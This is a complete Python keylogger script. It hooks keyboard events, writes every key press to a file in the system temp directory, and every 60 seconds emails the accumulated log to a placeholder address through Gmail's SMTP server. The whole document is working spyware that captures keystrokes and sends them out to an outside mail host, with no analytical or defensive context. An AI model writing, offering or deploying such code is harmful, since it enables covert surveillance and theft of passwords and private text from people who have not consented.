import keyboard
import threading
import time
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import os
import tempfile

log_file = os.path.join(tempfile.gettempdir(), "keylog.txt")
email_address = "your_email@example.com"
email_password = "your_email_password"

def log_keys():
    with open(log_file, "a") as f:
        while True:
            try:
                event = keyboard.read_event()
                if event.event_type == "down":
                    f.write(event.name + " ")
            except Exception as e:
                print(f"Error: {e}")
            time.sleep(0.1)

def send_email():
    with open(log_file, "r") as f:
        log_data = f.read()
    msg = MIMEMultipart()
    msg['From'] = email_address
    msg['To'] = email_address
    msg['Subject'] = 'Keylogger Data'
    body = log_data
    msg.attach(MIMEText(body, 'plain'))
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email_address, email_password)
    text = msg.as_string()
    server.sendmail(email_address, email_address, text)
    server.quit()

def start_keylogger():
    keyboard_thread = threading.Thread(target=log_keys)
    keyboard_thread.start()
    # Send email every 60 seconds
    while True:
        send_email()
        time.sleep(60)

if __name__ == "__main__":
    start_keylogger()
